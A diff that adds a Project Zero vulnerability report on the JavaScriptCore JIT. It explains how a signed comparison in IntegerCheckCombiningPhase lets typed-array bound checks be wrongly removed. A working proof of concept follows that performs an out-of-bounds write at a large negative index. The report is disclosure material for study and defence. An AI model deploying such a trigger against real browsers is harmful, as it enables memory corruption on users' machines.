@@ -1,0 +1,51 @@
+<!--
+Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1220
+
+When compiling Javascript code into machine code, bound checks for all accesses to a typed array are also inserted. These bound checks are re-optimized and the unnecessary checks are removed, which is performed by IntegerCheckCombiningPhase::handleBlock.
+For example, when the following JavaScript code is compiled, there are all bound checks for 8, 5, 2, but after the optimization, the checks for 5 and 2 are removed, and the only check for 8 will remain.
+
+function f() {
+    let arr = new Uint32Array(10);
+    for (let i = 0; i < 0x100000; i++) {
+        parseInt();
+    }
+    arr[8] = 1;
+    arr[5] = 2;
+    arr[2] = 3;
+}
+
+f();
+
+Note: parseInt is for forcing to start the JIT optimization.
+
+Here's a snippet IntegerCheckCombiningPhase::handleBlock.
+
+void handleBlock(BlockIndex blockIndex)
+{
+    ...
+        if (range.m_count) {
+            if (data.m_addend > range.m_maxBound) {
+                range.m_maxBound = data.m_addend;
+                range.m_maxOrigin = node->origin.semantic;
+            } else if (data.m_addend < range.m_minBound) {
+                range.m_minBound = data.m_addend;
+                range.m_minOrigin = node->origin.semantic;
+            }
+    ...
+}
+
+The problem is that the check |data.m_addend > range.m_maxBound| is a signed comparison.
+
+PoC:
+-->
+
+function f() {
+    let arr = new Uint32Array(10);
+    for (let i = 0; i < 0x100000; i++) {
+        parseInt();
+    }
+    arr[8] = 1;
+    arr[-0x12345678] = 2;
+}
+
+f();
